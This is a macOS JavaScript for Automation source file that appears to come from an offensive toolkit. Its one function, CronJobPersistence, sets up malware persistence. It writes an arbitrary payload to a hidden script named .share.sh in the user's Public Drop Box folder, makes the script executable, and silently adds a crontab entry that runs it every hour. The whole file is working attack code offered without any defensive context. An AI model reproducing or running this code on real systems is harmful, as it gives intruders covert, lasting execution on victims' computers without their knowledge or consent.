//Current implementation only works under a user context
function CronJobPersistence (cronJobaction) {
ObjC.import('Foundation')
ObjC.import('stdlib')
var currentApp = Application.currentApplication();
currentApp.includeStandardAdditions = true;

var userHome = $.getenv('HOME')

var output = ""
try{
//Write cronJobaction to hidden script
var cronFilepath = userHome + "/Public/Drop\ Box/.share.sh"
function writeTextToFile(text, file, overwriteExistingContent) {
        var fileString = file.toString()
        var openedFile = currentApp.openForAccess(Path(fileString), { writePermission: true })
        if (overwriteExistingContent) {
            currentApp.setEof(openedFile, { to: 0 })
        }
        currentApp.write(text, { to: openedFile, startingAt: currentApp.getEof(openedFile) })
        currentApp.closeAccess(openedFile)
}
writeTextToFile(cronJobaction, cronFilepath, true)
        
function executeBackground(actionPath){
	var path = "/bin/chmod"
	var args = ["+x",actionPath,"&"]
	var pipe = $.NSPipe.pipe;
	var file = pipe.fileHandleForReading;
	var task = $.NSTask.alloc.init;
	task.launchPath = path;
	task.arguments = args;
	task.standardOutput = pipe; 
	task.standardError = pipe;
	task.launch; 
	}        

//Write cronjob change to allow execution
var cronTask =  `echo "$(echo '15 * * * * cd $HOME/Public/Drop\\ Box/ && ./.share.sh' ; crontab -l)" | crontab - `
      
currentApp.doShellScript(cronTask)
executeBackground(cronFilepath)

output += "CronJob Persistence intalled at " + cronFilepath 

}catch(error){
       output += error.toString()
		}
	return output
}
